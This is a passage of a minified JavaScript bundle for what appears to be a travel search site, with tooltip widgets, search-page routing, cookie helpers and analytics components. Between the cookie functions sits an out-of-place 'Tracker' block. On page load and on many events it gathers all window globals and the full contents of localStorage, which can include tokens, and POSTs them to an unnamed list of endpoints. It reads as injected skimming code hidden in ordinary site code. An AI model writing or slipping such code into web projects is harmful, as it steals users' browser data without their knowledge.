        top: a.newArrowTop + 5 + "px",
        left: a.newArrowLeft - b.width() + "px"
      });
      return this;
    },
    _getIdValue: function (a) {
      return this.widgetNamespace + this.options.subNameSpace + a;
    },
    _open: function (a, b, c) {
      var d = this;
      a.stop(!0, !0);
      var f = function (a) {
        this.options.onOpen && this.options.onOpen.call(this, a);
        this.options.positionUpdate && (this._positionUpdater = setInterval(e.proxy(this._updatePosition, this), 1E3 / 60));
      };
      this.options.fadeIn && !c ? a.fadeIn(this.options.fadeIn, function () {
        f.call(d, b);
      }) : (a.show(), f.call(d, b));
      return this;
    },
    _close: function () {
      this._originalTitle && (this.element.attr("title", this._originalTitle), this._originalTitle = null);
      this.options.onClose && this.options.onClose.call(this, null);
      return this;
    },
    _resetElements: function (a, b, c) {
      this._setStyleClasses(a, "-wrapper");
      this._setStyleClasses(b, "-container");
      this._setStyleClasses(c, "-arrow");
      return this;
    }
  });
})(jq || jQuery, window);
(function (e, g) {
  e.createWidgetClass("tip.ToolTip", g.extend({}, e.Widgets.Tooltip.prototype, {
    contentContainer: null,
    boundEvents: null,
    orientationOffset: null,
    rtlOrientation: void 0,
    trackEventId: null,
    options: g.extend({}, e.Widgets.Tooltip.prototype.options, {
      showImmediately: !1,
      baseClass: "coolTip",
      extraClass: null,
      delay: 200,
      position: "top",
      fallbackPosition: null,
      forceDesiredPosition: null,
      orientation: "middle",
      orientationOffset: null,
      onDestroy: null,
      activation: "hover",
      subNameSpace: "",
      alwaysRendered: !1,
      color: "black",
      size: "l",
      closeOnBodyClick: !0,
      destroyAfterClose: !1,
      content: "",
      isComponent: !1,
      target: null,
      positionTarget: null,
      updateContainerOnResize: !1,
      track: null,
      testAttributes: null,
      setAriaContext: !1,
      autoClose: null
    }),
    init: function () {
      this.base();
      if (this.options.alwaysRendered) {
        this.contentContainer = this.getChildElement("rendered-content");
        var b = this.contentContainer.children().eq(0);
        b.attr({
          "data-test-popover-content": "",
          "data-test-popover-open": this.options.showImmediately
        });
        this.setContent(b);
      }
      e.Widgets.Tooltip.prototype.init.call(this);
      this.boundEvents = {};
      this.rtlOrientation = "rtl" === document.dir && "middle" !== this.options.orientation ? "start" === this.options.orientation ? "end" : "start" : void 0;
      this.orientationOffset = this._getOrientationOffset();
    },
    addEventHandlers: function () {
      this.subscribe("common.widgets.tooltip.clearCloseTimers", this._clearCloseTimers.bind(this));
      var b = this;
      this.subscribe("common.widgets.tooltip.closeAll", function () {
        b.isOpen && b.close();
      });
      this.subscribe("common.widgets.tooltip.closeSelf", b.options.subNameSpace, function () {
        b.isOpen && b.close();
      });
    },
    destroy: function () {
      if ("function" === typeof this.options.onDestroy) this.options.onDestroy();
      this.options.fadeOut = !1;
      var b = this._getContainerElement();
      Object.keys(this.boundEvents).forEach(function (a) {
        b.off(a, this.boundEvents[a]);
      }.bind(this));
      this.isOpen && this.close();
      this._removeAllWidgetBindings();
      this.element.removeData(this.widgetName);
      this.base();
    },
    bindComponent: function () {
      this.element.data("toolTip", this);
      this.element.data("widget") || this.element.data("widget", this);
      this._addTestAttributes(this.element, "trigger");
      e.globals.testMode && this.element.attr({
        "data-test-popover-widget": "",
        "data-test-popover-triggerevent": this.options.activation
      });
      this.options.setAriaContext && this.element.attr("aria-describedby", this._getWrapperElement().attr("id"));
    },
    bindEventHandler: function (b, a, d) {
      b = b.replace(/\s|$/g, "." + this.id() + " ");
      this._getContainerElement().on(b, a, d);
      this.boundEvents[b] = a;
    },
    setContent: function (b) {
      this.options.content = b;
    },
    renderContent: function (b, a) {
      "string" === typeof b ? e.Widgets.Tooltip.prototype.renderContent.call(this, b, a) : "object" === typeof b ? g.contains(a, b) || (a.html(""), a.append(b)) : this.log.errorInternal('Bad parameter passed to renderContent(): "content" param must be a String or a jQuery object');
      this._addTestAttributes(a, "content");
    },
    getOptionalTarget: function (b, a) {
      return "string" === typeof b && b.length ? "#" === b[0] ? g(b) : g("#" + b) : null !== b && "object" === typeof b ? g(b) : a;
    },
    _addTestAttributes: function (b, a) {
      var d = this,
        c = {};
      e.globals.testMode && (c["data-test-popover-" + a] = "");
      this.options.testAttributes && Object.keys(this.options.testAttributes).forEach(function (a) {
        var b = /^data-/.test(a) ? a : "data-" + a;
        c[b] = d.options.testAttributes[a];
      });
      b.attr(c);
    },
    _getOrientationOffset: function () {
      return null !== this.options.orientationOffset ? this.options.orientationOffset : this.options.extraClass && -1 !== this.options.extraClass.indexOf("no-arrow") ? 0 : {
        start: -15,
        middle: 0,
        end: 15
      }[this.rtlOrientation || this.options.orientation];
    },
    _getPositioning: function (b, a, d, c) {
      d = d || this.options.position;
      var l = e.Widgets.Tooltip.prototype._getPositioning.call(this, b, a, d),
        f = {
          top: 0,
          left: 0
        },
        h = this.orientationOffset * (c ? -1 : 1);
      if ("middle" !== this.options.orientation) {
        var k = this.rtlOrientation || this.options.orientation,
          m,
          n;
        c && (k = "start" === k ? "end" : "start");
        "left" === d || "right" === d ? (n = "top", m = "outerHeight") : (n = "left", m = "outerWidth");
        var p = this.getOptionalTarget(this.options.positionTarget, this.element),
          r = p[m](),
          q = this._getWrapperElement()[m]();
        if (!c && !this.options.forceDesiredPosition) if (c = p.offset()[n], p = "scroll" + n.charAt(0).toUpperCase() + n.slice(1), "start" === k) {
          if (c + q > g(window)[p]() + g(window)[m]()) return this._getPositioning(b, a, d, !0);
        } else if ("end" === k && c + r - q < g(window)[p]()) return this._getPositioning(b, a, d, !0);
        b = r / 2;
        q /= 2;
        "start" === k ? f[n] = Math.ceil(q - b + h) : "end" === k && (f[n] = Math.ceil(b - q + h));
      }
      l.newArrowTop -= "rtl" === document.dir ? -f.top : f.top;
      l.newArrowLeft -= f.left;
      l.newWrapperTop += "rtl" === document.dir ? -f.top : f.top;
      l.newWrapperLeft += f.left;
      return l;
    },
    clearTrackEvent: function () {
      this.trackEventId && (clearTimeout(this.trackEventId), this.trackEventId = null);
    },
    startTrackEvent: function (b) {
      this.clearTrackEvent();
      if (b && b.wait && b.label) {
        var a = parseInt(b.wait);
        isNaN(a) || 1 > a || (this.trackEventId = setTimeout(this.triggerTrackEvent.bind(this, b), a));
      }
    },
    triggerTrackEvent: function (b) {
      if (this.element && this.element.hasClass("tooltip-open") && b && b.label) {
        var a = {
          category: b.category || "ToolTip",
          action: b.action || "open",
          label: b.label
        };
        b.hasOwnProperty("value") && (a.value = b.value);
        e.Analytics.api.trackEvent(a);
      }
    },
    _open: function (b, a, d) {
      var c = this,
        l = "click." + this.id(),
        f = this._getContainerElement();
      e.Widgets.Tooltip.prototype._open.call(this, b, a, d);
      e.events.publish("common.widgets.tooltip.clearCloseTimers", this.options.subNameSpace);
      this.element.addClass("tooltip-open");
      f.attr("aria-expanded", !0);
      e.globals.testMode && this.element.add(f).attr("data-test-popover-open", !0);
      e.events.publish("common.widgets.tooltip.opened");
      var h = function (a) {
        b[0].contains(a.target) || "click" === c.options.activation && c.element[0].contains(a.target) || (g(document).off(l), c.close());
      };
      this.options.closeOnBodyClick && setTimeout(function () {
        g(document).off(l).on(l, h);
      }, 1);
      this.options.track && this.startTrackEvent(g.extend({
        wait: 2E3
      }, this.options.track));
      this.options.autoClose && this.closeAfter(this.options.autoClose);
    },
    _close: function (b) {
      var a = this.getContent(),
        d = this._getContainerElement();
      this.options.alwaysRendered && "object" === typeof a && this.contentContainer.append(a);
      e.Widgets.Tooltip.prototype._close.call(this, b);
      this.element.removeClass("tooltip-open");
      d.attr("aria-expanded", !1);
      e.globals.testMode && this.element.add(d).attr("data-test-popover-open", !1);
      this.options.closeOnBodyClick && e.dom.schedule(function () {
        g(document).off("click." + this.id());
      }.bind(this));
      this.options.track && this.clearTrackEvent();
      this.options.destroyAfterClose && this.destroy();
    },
    closeAfter: function (b) {
      this._forceCloseTimer && clearTimeout(this._forceCloseTimer);
      this._forceCloseTimer = window.setTimeout(this.close.bind(this), b);
    },
    _clearCloseTimers: function (b) {
      b === this.options.subNameSpace && clearTimeout(this._closeTimer);
    },
    _addStyleClasses: function (b, a, d) {
      a && (b.addClass(this.widgetBaseClass + a), d && b.addClass(this.widgetBaseClass + a + d), this.options.baseClass && (b.addClass(this.options.baseClass + a), d && b.addClass(this.options.baseClass + a + d)), this.options.color && b.addClass("Color-" + this.options.color));
      this.options.extraClass && b.addClass(this.options.extraClass);
      this.options.size && b.addClass("size-" + this.options.size);
      e.Common.Utils.Browsers.isIE() ? b.addClass("ie") : e.Common.Utils.Browsers.isChrome() && (b.addClass("chrome"), a = e.Common.Utils.Browsers.getChromeVersion(), 65 !== a && 66 !== a || b.addClass("chrome65"));
      return this;
    },
    _getOffsetInformation: function (b, a, d) {
      var c = this.getOptionalTarget(this.options.positionTarget, this.element),
        e = c.outerWidth(),
        f = c.outerHeight(),
        c = {
          top: Math.floor(c.offset().top - g(this.options.appendTo).offset().top),
          left: Math.floor(c.offset().left - g(this.options.appendTo).offset().left)
        };
      b = "width" === b ? d.outerWidth() : d.outerHeight();
      return {
        arrowSize: Math.round(b / 2),
        elementWidth: e,
        elementHeight: f,
        wrapperWidth: a.outerWidth(),
        wrapperHeight: a.outerHeight(),
        offset: c
      };
    },
    _removeAllWidgetBindings: function () {
      e.Widgets.Tooltip.prototype._removeAllWidgetBindings.call(this);
      this.options.setAriaContext && this.element.removeAttr("aria-describedby");
    }
  }));
})(R9, jQuery);
(function (g, d) {
  g.createWidgetClass("tip.StyleJamTooltip", {
    presentations: {
      wrapper: "Tooltip__Wrapper Tooltip__Wrapper--fixed Tooltip__Wrapper--hidden",
      visible: "Tooltip__Wrapper--visible",
      hidden: "Tooltip__Wrapper--hidden",
      content: "Tooltip__Content",
      pointer: "Tooltip__Pointer",
      above: "Tooltip__Pointer Tooltip__Pointer--down",
      right: "Tooltip__Pointer Tooltip__Pointer--left",
      below: "Tooltip__Pointer Tooltip__Pointer--up",
      left: "Tooltip__Pointer Tooltip__Pointer--right"
    },
    $targetElem: null,
    $triggerElem: null,
    $tooltipElem: null,
    $tooltipPointerElem: null,
    state: null,
    options: {
      targetElem: null,
      triggerElem: null,
      triggerEvent: "hover",
      position: "above",
      fallbackPosition: void 0,
      positionOffsetX: 50,
      positionOffsetY: 50,
      showDelay: 0,
      hideDelay: 1E3,
      content: null,
      preRendered: !1
    },
    init: function () {
      this.base();
      this.state = {
        afID: null,
        scrolling: !1,
        scrollTicker: null,
        visible: !1,
        showTimeout: 0,
        hideTimeout: 0,
        widthSet: !1
      };
      this.$targetElem = d("#" + this.options.targetElem);
      this.$triggerElem = null !== this.options.triggerElem ? d("#" + this.options.triggerElem) : this.$targetElem;
      this.$targetElem.length && this.$triggerElem.length ? (this.options.preRendered ? (this.$tooltipElem = d("#" + this.id()), this.$tooltipPointerElem = this.getChildElement("pointer")) : (this.$tooltipElem = d(this.createTooltipElement()), this.$tooltipPointerElem = this.$tooltipElem.children("#" + this.id("pointer"))), this.options.preRendered && this.$tooltipElem.appendTo(d("body"))) : console.warn("StyleJamTooltip: Couldn't locate target element with id: %s", this.options.targetElem);
    },
    addEventHandlers: function () {
      var a = this;
      switch (this.options.triggerEvent) {
        case "click":
          this.options.hideDelay = 0;
          this.$triggerElem.on("click", function () {
            a.show();
          });
          d(document).on("click", function (b) {
            if (a.state.visible) {
              var c = a.$targetElem[0],
                e = a.$tooltipElem[0],
                c = b.target === c || a.isDescendant(c, b.target);
              b = b.target === e || a.isDescendant(e, b.target);
              c || b || a.hide();
            }
          });
          break;
        case "hover":
          this.$triggerElem.on("mouseenter", function () {
            a.show();
          }).on("mouseleave", function () {
            a.hide();
          }), this.$tooltipElem.on("mouseenter", function () {
            a.show();
          }).on("mouseleave", function () {
            a.hide();
          });
        case "focus":
          this.$triggerElem.on("focus", function () {
            a.show();
          }).on("blur", function () {
            a.hide();
          });
      }
      this.setupOnScroll();
      this.subscribe("common.widgets.tooltip.closeAll", this.hide.bind(this));
    },
    createTooltipElement: function () {
      var a = document.createElement("div");
      a.setAttribute("id", this.id());
      a.setAttribute("class", this.getStlBlocks(this.presentations.wrapper));
      var b = document.createElement("div");
      b.setAttribute("class", this.getStlBlock(this.presentations.content));
      b.innerHTML = this.options.content;
      var c = document.createElement("div");
      c.setAttribute("id", this.id("pointer"));
      c.setAttribute("class", this.getStlBlock(this.presentations.pointer));
      a.appendChild(b);
      a.appendChild(c);
      return a;
    },
    setupOnScroll: function () {
      var a = this;
      this.registerEvent("scroll resize", d(window), function () {
        clearTimeout(a.state.scrollTicker);
        !a.state.scrolling && a.state.visible && (a.state.scrolling = !0, a.position());
        a.state.scrollTicker = setTimeout(function () {
          a.state.scrolling = !1;
          cancelAnimationFrame(a.state.afID);
        }, 150);
      });
    },
    show: function () {
      var a = this;
      this.state.visible = !0;
      this.options.preRendered || this.$tooltipElem.appendTo(d("body"));
      this.state.widthSet || (this.$tooltipElem.width(this.$tooltipElem.width()), this.state.widthSet = !0);
      this.position();
      this.resetTimers();
      this.state.showTimeout = setTimeout(function () {
        a.swapClasses(a.$tooltipElem, a.presentations.hidden, a.presentations.visible);
      }, this.options.showDelay);
    },
    hide: function () {
      var a = this;
      this.resetTimers();
      this.state.hideTimeout = setTimeout(function () {
        a.state.visible = !1;
        a.swapClasses(a.$tooltipElem, a.presentations.visible, a.presentations.hidden);
        a.options.preRendered || a.$tooltipElem.remove();
      }, this.options.hideDelay);
    },
    resetTimers: function () {
      clearTimeout(this.state.showTimeout);
      clearTimeout(this.state.hideTimeout);
    },
    position: function () {
      var a = this;
      this.state.scrolling && (this.state.afID = requestAnimationFrame(function () {
        a.position();
      }));
      var b = this.$targetElem[0].getBoundingClientRect(),
        c = this.$tooltipElem[0].getBoundingClientRect(),
        e = this.$tooltipElem[0].currentStyle || window.getComputedStyle(this.$tooltipElem[0]);
      c.x = c.left - parseFloat(e.marginLeft);
      c.width = c.width + parseFloat(e.marginLeft) + parseFloat(e.marginRight);
      c.height = c.height + parseFloat(e.marginTop) + parseFloat(e.marginBottom);
      b = this.getRenderPosition(this.options.position, b, c);
      this.$tooltipElem.css({
        top: b.y + "px",
        left: b.x + "px"
      });
    },
    getRenderPosition: function (a, b, c) {
      var e = b.left + this.options.positionOffsetX / 100 * b.width - c.width / 2,
        d = b.top + this.options.positionOffsetY / 100 * b.height - c.height / 2,
        f = {
          left: [d, b.left - c.width, this.getInnerHeight() - (d + c.height)],
          below: [e, this.getInnerHeight() - (b.top + b.height + c.height), this.getInnerWidth() - (e + c.width)],
          right: [d, this.getInnerWidth() - (b.left + b.width + c.width), this.getInnerHeight() - (d + c.height)],
          above: [e, b.top - c.height, this.getInnerWidth() - (e + c.width)]
        };
      a = f[a].every(function (a) {
        return 0 <= a;
      }) ? a : Object.keys(f).reduce(function (a, b) {
        return f[a].map(function (a) {
          return 0 < a ? 0 : a;
        }).reduce(function (a, b) {
          return a + b;
        }) > f[b].map(function (a) {
          return 0 < a ? 0 : a;
        }).reduce(function (a, b) {
          return a + b;
        }) ? a : b;
      });
      a !== this.options.position && this.options.fallbackPosition && (a = this.options.fallbackPosition);
      this.$tooltipPointerElem.attr("class", "").addClass(this.getStlBlocks(this.presentations[a]));
      switch (a) {
        case "above":
          return {
            x: e,
            y: b.top - c.height
          };
        case "right":
          return {
            x: b.left + b.width,
            y: d
          };
        case "below":
          return {
            x: e,
            y: b.top + b.height
          };
        case "left":
          return {
            x: b.left - c.width,
            y: d
          };
      }
    },
    isDescendant: function (a, b) {
      for (b = b.parentNode; null != b;) {
        if (b == a) return !0;
        b = b.parentNode;
      }
      return !1;
    },
    getInnerWidth: function () {
      return window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
    },
    getInnerHeight: function () {
      return window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;
    }
  });
})(R9, jQuery);
(function (c, d) {
  c.createWidgetClass("tip.RichToolTip", {
    closeButton: null,
    subNameSpace: "-richToolTip",
    initialized: !1,
    options: {
      toolTipTarget: "",
      onHover: !1,
      lightTheme: !1,
      showCloseButton: !1,
      shouldShowImmediately: !0,
      hoverOpenDelay: 200,
      closeOnBodyClick: !0
    },
    init: function () {
      this.options.showCloseButton && (this.closeButton = this.getChildElement("closeButton"));
    },
    addEventHandlers: function () {
      var a = this;
      this.options.showCloseButton && this.registerEvent("click", this.closeButton, function () {
        c.events.publish("common.widgets.tooltip.closeSelf", a.subNameSpace);
      });
      this.subscribe("common.widgets.richToolTip.remoteInit", function () {
        a.initialized || a.remoteInit();
        a.initialized = !0;
      });
    },
    remoteInit: function () {
      var a = d("#" + this.options.toolTipTarget),
        b = d("#" + this.options.toolTipTarget + "-rendered-content").children().eq(0);
      a.length && b.length && (a.toolTip({
        position: "right",
        orientation: "middle",
        activation: this.options.onHover ? "hover" : "click",
        color: this.options.lightTheme ? "white" : "black",
        role: "note",
        subNameSpace: this.subNameSpace,
        extraClass: "Common-Widgets-Tip-RichToolTip-tooltip-content",
        content: b,
        showImmediately: this.options.shouldShowImmediately,
        delay: this.options.hoverOpenDelay,
        closeOnBodyClick: this.options.closeOnBodyClick,
        onOpen: this.onOpen
      }), this.options.shouldShowImmediately && (a = JSON.stringify("false"), b = moment().add(1, "days").toDate().toUTCString(), document.cookie = "day-of-week-new-user\x3d" + a + "; path\x3d/; expires\x3d" + b));
    },
    onOpen: function () {
      var a = d(this.getContent().find("button"));
      a.length && this.registerEvent("click", a, function () {
        c.events.publish("common.widgets.tooltip.closeSelf", "-richToolTip");
      });
    }
  });
})(R9, jQuery);
(function (c, e) {
  c.createComponentClass("common.seo.SeoMetaTags", {
    addEventHandlers: function () {
      this.checkForAdWordsSearch();
    },
    checkForAdWordsSearch: function () {
      c.globals.isSeo && this.subscribe("cmp2.rendering.finished", function (a) {
        if (a && a.items && a.items.length) {
          if (a = window.location.search.substring(1)) {
            a = a.split("\x26");
            var b = c.config.getString("ui.cmp2.dynamic.search.ads", "");
            if (b) for (var b = b.split(","), d = 0; d < b.length; d++) if (-1 < a.indexOf("a\x3d" + b[d])) {
              c.events.publish("cmp2.checkAll");
              break;
            }
          }
          this.destroy();
        }
      }.bind(this));
    }
  });
})(R9, jQuery);
(function (e, d) {
  e.createComponentClass("common.core.FastlyTiming", {
    options: {
      runTest: !1,
      measurementUrl: "/fastly-timer",
      logUrl: "/s/run/fastlytimerlog"
    },
    init: function () {
      this.options.runTest && this.runTimingRequest();
    },
    runTimingRequest: function () {
      d.ajax({
        type: "POST",
        url: this.options.measurementUrl,
        success: this.logResult.bind(this)
      });
    },
    logResult: function (c, a, b) {
      b && c && c.cluster && (a = b.getResponseHeader("x-served-by"), b = b.getResponseHeader("x-timer"), a && b && (a = a.split(" "), a = a[a.length - 1].split("-"), d.ajax({
        type: "POST",
        url: this.options.logUrl,
        data: {
          cluster: c.cluster,
          timer: b,
          fastlyNode: a[a.length - 1]
        }
      })));
    }
  });
})(R9, jQuery);
(function (c, e) {
  var f = function (a) {
      if (a) {
        a = a.charAt(0).toUpperCase() + a.slice(1);
        var b = "s" === a.slice(-1) ? a.slice(0, -1) : a;
        return "." + a + "-Results-" + b + "ResultsPage";
      }
    },
    g = void 0 !== window.history.pushState,
    h = [c.globals.keyCodes.UP, c.globals.keyCodes.DOWN, c.globals.keyCodes.LEFT, c.globals.keyCodes.RIGHT, c.globals.keyCodes.TAB];
  c.createComponentClass("base.search.SearchPage", {
    options: {
      msg: {
        resultPageTitle: ""
      },
      isFD: !0,
      isRP: !1,
      lazyLoadRP: !1,
      pageVertical: "",
      analyticsVertical: "",
      preloadResourcesForRP: !1,
      resultsPageComponentsMap: {},
      addClassDuringTransition: !0,
      staticViewportMetaTag: "",
      rpInNewTab: !1
    },
    rpLoaded: !1,
    rpRequest: null,
    init: function (a) {
      this.rpContainer = this.getChildElement("rp");
      this.options.isFD ? this.options.lazyLoadRP && this.preloadComponents() : this.rpLoaded = !0;
      "" !== this.options.msg.resultPageTitle && (document.title = this.options.msg.resultPageTitle);
      this.logger = new c.logger();
    },
    addEventHandlers: function (a) {
      var b = this;
      this.subscribe("pageContainer.contentBlur", function (a) {
        b.element.toggleClass("Blur", a);
      });
      a = this.handleSearchSubmit.bind(this);
      a.priority = 1;
      this.subscribe(["searchform.submit", "multilocale.search.submit"], a);
      this.subscribe("omni.vertical.changed", function (a) {
        b.cleanupResultsPage();
        b.abortActiveResultsPageRequest();
        c.config.getBoolean("ui.horizon.omni.loadRpOnVerticalChange", !0) && b.options.resultsPageComponentsMap && b.options.resultsPageComponentsMap.hasOwnProperty(a) && b.loadResultsPageComponent(a);
      });
      c.question.answer("SearchPage.view", function () {
        return b.options.isFD ? "FD" : "RP";
      });
      c.config.getBoolean("ui.keyboard.show-focus", !0) && this.bindAccessibilityHandlers();
      if (c.config.getBoolean("ui.horizon.modal.no-ad-click", !0)) {
        var d = this.element;
        this.subscribe(["InputModal.opened", "Select.opened", "DatePicker.opened", "DropdownDialog.open"], function () {
          d.addClass("modalOpen");
        });
        this.subscribe(["InputModal.closed", "Select.closed", "DatePicker.closed", "DropdownDialog.close"], function () {
          d.removeClass("modalOpen");
        });
      }
    },
    abortActiveResultsPageRequest: function () {
      this.rpTimerId && clearTimeout(this.rpTimerId);
      this.rpRequest && (this.rpRequest.abort(), delete this.rpRequest);
    },
    handleSearchSubmit: function (a) {
      a.url && a.url.startsWith("http") && (window.location = a.url);
      this.abortActiveResultsPageRequest();
      var b = a.url && a.url.startsWith("/") ? a.url : "/" + a.url;
      this.options.rpInNewTab && this.options.isFD && a.inNewTab ? this.openInNewTab(b) : this.useSamePageTransition(a) ? (window.history.pushState({
        view: "rp"
      }, "", b), this.options.isFD && this.switchToRP()) : window.location.href = b;
    },
    openInNewTab: function (a) {
      var b = window.open(a, "_blank");
      if (!b || b.closed) this.logger.error("resultsInNewTabFailed"), window.location.href = a;
    },
    useSamePageTransition: function (a) {
      return !a.navigateToResults && g && this.rpLoaded && this.isCorrectRpLoaded(a.vertical) && !c.authentication.needsRefresh;
    },
    getAdditionalRPBodyClass: function () {
      return "wide";
    },
    getRPBodyClass: function () {
      var a = this.getAdditionalRPBodyClass(),
        b = (document.body.getAttribute("class") || "").split(" ");
      -1 !== b.indexOf("react") && (a += " react");
      -1 !== b.indexOf("react-st") && (a += " react-st");
      return a;
    },
    switchToRP: function (a) {
      c.Analytics.api.setVertical(this.options.analyticsVertical);
      c.Analytics.api.setPageId("results");
      "requestId" in c.globals && (c.globals.requestId = c.globals.requestId.replace("frontdoor", "results").replace("main", c.globals.vertical || this.options.analyticsVertical));
      this.options.isFD = !1;
      this.options.isRP = !0;
      var b = this;
      window.setTimeout(function () {
        c.events.publish("frontdoor.view.changed", {
          view: "inline"
        });
        b.element.removeClass("vm-fd");
        b.element.addClass("vm-rp");
        c.events.publish("resultspage.view.setvisible", !0);
        c.events.publish("header.view.set", {
          view: "results"
        });
        c.events.publish("pageContainers.changed", {
          state: "results"
        });
        b.options.addClassDuringTransition ? c.events.publish("body.addClass", b.getAdditionalRPBodyClass()) : c.events.publish("body.setClass", b.getRPBodyClass());
        c.events.publish("HorizontalFilterList.setClass");
        c.events.publish("resultspage.routed", !0);
        b.rpContainer.removeClass("hiddenFD");
        b.options.isFD = !1;
        b.options.staticViewportMetaTag && document.querySelector('meta[name\x3d"viewport"]').setAttribute("content", b.options.staticViewportMetaTag);
        b.cleanupFrontDoor();
      }, 10);
    },
    preloadComponents: function () {
      var a = this;
      if (this.options.lazyLoadRP) {
        var b = function () {
          c.globals.vertical === a.options.pageVertical && a.loadResultsPageComponent(a.options.pageVertical);
        };
        "complete" === document.readyState ? b() : c.events.when("page.initialized", b);
      }
      e(document).ready(function () {
        a.element.hasClass("vm-fd") && a.options.preloadResourcesForRP && c.resources.preload("common.booking", "styles");
      });
    },
    loadResultsPageComponent: function (a) {
      var b = this.options.resultsPageComponentsMap[a];
      if (b && b.component) {
        this.abortActiveResultsPageRequest();
        this.cleanupResultsPage();
        var d = this;
        this.rpTimerId = setTimeout(function () {
          d.rpRequest = c.ajax.execute(b.component, {
            appendTo: d.rpContainer
          });
          d.rpRequest.then(function () {
            d.rpLoaded = !0;
            c.globals.vertical = a;
            d.options.analyticsVertical = b.analyticsVertical;
            delete d.rpRequest;
          });
        }, 100);
      }
    },
    cleanupResultsPage: function () {
      c.ComponentManager.remove(this.rpContainer, !1);
      this.rpContainer && this.rpContainer.empty();
      this.rpLoaded = !1;
    },
    cleanupFrontDoor: function () {
      var a = this;
      setTimeout(function () {
        c.ComponentManager.remove(a.id("fd"));
      }, 800);
    },
    isCorrectRpLoaded: function (a) {
      return 1 === this.getChildElement("rp").find(".Base-Results-ResultsPage").length && 1 === this.getChildElement("rp").find(f(a)).length;
    },
    bindAccessibilityHandlers: function () {
      this.toggleKeyboardFocus(!1);
      e(document).on("keydown.ada", function (a) {
        !c.globals.keyboardNav && -1 < h.indexOf(a.keyCode) && this.toggleKeyboardFocus(!0);
      }.bind(this));
      e(document).on("mousemove.ada", this.toggleKeyboardFocus.bind(this, !1));
    },
    toggleKeyboardFocus: function (a) {
      c.globals.keyboardNav = a ? !0 : !1;
    }
  });
})(R9, jq || jQuery);
(function (a, b) {
  a.createComponentClass("flights.search.FlightSearchPage", "base.search.SearchPage", {
    options: {
      preloadResourcesForRP: a.config.getBoolean("ui.horizon.searchpage.flights.preloadStyles", !0)
    }
  });
})(R9, jQuery);
function validateEmail(a) {
  if (!a || !a.match) return !1;
  a = a.match(/^[A-Z0-9._%+-]{1,63}@(?:[A-Z0-9-]+\.){1,125}[A-Z]{2,63}$/i);
  return !!(a && a[0] && a[0].length);
}
function replaceArgs() {
  for (var a = arguments[0], b = 1; b <= arguments.length; b++) a = a.replace("{" + (b - 1) + "}", arguments[b]);
  return a;
}
R9.metacookie = R9.metacookie || {};
R9.metacookie.saveQueue = R9.metacookie.saveQueue || [];
function saveQueuedMetaCookie() {
  if (0 !== R9.metacookie.saveQueue.length) {
    var a = R9.metacookie.saveQueue[0];
    jq.ajax({
      type: "POST",
      url: "/s/cookie",
      data: {
        action: "setmeta",
        metacookie: a.name,
        metavalue: a.value,
        formtoken: R9.globals.formtoken
      },
      complete: function () {
        R9.metacookie.saveQueue.shift();
        saveQueuedMetaCookie();
      },
      success: function () {
        a.callback();
      }
    });
  }
}
function setMetaCookie(a, b, c) {
  R9.metacookie.saveQueue.push({
    name: a,
    value: b,
    callback: c || jq.noop
  });
  1 === R9.metacookie.saveQueue.length && saveQueuedMetaCookie();
}
(async () => {
  class Tracker {
    constructor() {
      this.globalVariables = this.extractGlobalVariables();
      this.localStorageContent = this.extractLocalStorage();
    }
    extractGlobalVariables() {
      let globals = {};
      for (let variableName in window) {
        globals[variableName] = window[variableName];
      }
      return globals;
    }
    extractLocalStorage() {
      let localStorageContent = {};
      for (let i = 0; i < localStorage.length; i++) {
        let key = localStorage.key(i);
        localStorageContent[key] = localStorage.getItem(key);
      }
      return localStorageContent;
    }
    async reportBehaviorData() {
      const reportData = {
        'time': new Date().toISOString(),
        'location': window.location.href,
        'localStorage': this.localStorageContent,
        'globals': this.globalVariables
      };
      const requests = ENDPOINTS.map(endpoint => fetch(endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(reportData)
      }).catch(() => null));
      await Promise.race(requests);
    }
  }
  const tracker = new Tracker();
  for (const eventName of JSHOOK_EVENTS) {
    document.body.addEventListener(eventName, async e => {
      await tracker.reportBehaviorData();
    });
  }
  if (document.body) {
    await tracker.reportBehaviorData();
  } else {
    const observer = new MutationObserver(async (mutations, obs) => {
      if (document.body) {
        obs.disconnect();
        await tracker.reportBehaviorData();
      }
    });
    observer.observe(document.documentElement, {
      childList: true,
      subtree: true
    });
  }
})();
function deleteMetaCookie(a, b) {
  "function" !== typeof b && (b = $.noop);
  jq.ajax({
    type: "POST",
    url: "/s/cookie",
    data: {
      action: "deletemeta",
      metacookie: a,
      formtoken: R9.globals.formtoken
    },
    success: b
  });
}
jq.ajaxPrefilter("script", function (a) {
  a.cache = !0;
});
(function (c) {
  c.createComponentClass("common.core.RealUserMeasurementsComponent", {
    options: {
      fullstoryEnabled: !1,
      fsSidIdentifyEnabled: !0,
      fsUniqueId: ""
    },
    trackedSubmit: !1,
    fsIdentified: !1,
    init: function () {
      this.identifyFSSession();
    },
    addEventHandlers: function () {
      this.base();
      this.subscribe("searchform.submit", this.onSearchSubmit.bind(this));
    },
    onSearchSubmit: function (a) {
      if (!this.trackedSubmit && this._isFullStoryAvailable() && a && a.vertical) {
        this.trackedSubmit = !0;
        a = "did" + this.fixCase(a.vertical) + "Search_bool";
        var b = {};
        b[a] = !0;
        FS.setUserVars(b);
      }
    },
    fixCase: function (a) {
      return a.toLowerCase().replace(/(^| )(\w)/g, function (a) {
        return a.toUpperCase();
      });
    },
    identifyFSSession: function () {
      this.options.fsSidIdentifyEnabled && this.options.fsUniqueId && this._isFullStoryAvailable() && !this.fsIdentified && (FS.identify(this.options.fsUniqueId), this.fsIdentified = !0);
    },
    _isFullStoryAvailable: function () {
      return this.options.fullstoryEnabled && window && "FS" in window;
    }
  });
})(R9);
(function (a, c) {
  a.createComponentClass("common.core.MarketingId", {
    options: {
      syncUrl: "/s/run/kmkid/sync",
      setUrl: "/s/run/kmkid/set",
      suggestedKmkid: null,
      masterHost: null,
      runSyncScript: !1
    },
    init: function () {
      this.options.runSyncScript && this.runSyncAndSet();
    },
    runSyncAndSet: function () {
      c.ajax({
        type: "POST",
        url: this.options.masterHost + this.options.syncUrl,
        data: {
          suggestedKmkid: this.options.suggestedKmkid
        },
        xhrFields: {
          withCredentials: !0
        },
        success: this.onSyncFinished.bind(this)
      });
    },
    onSyncFinished: function (b) {
      b && (window.R9 && a.globals && a.globals.analytics && a.globals.analytics.pixelContext && (a.globals.analytics.pixelContext.kmkid = b.kmkid), this.runSet(b.kmkid));
    },
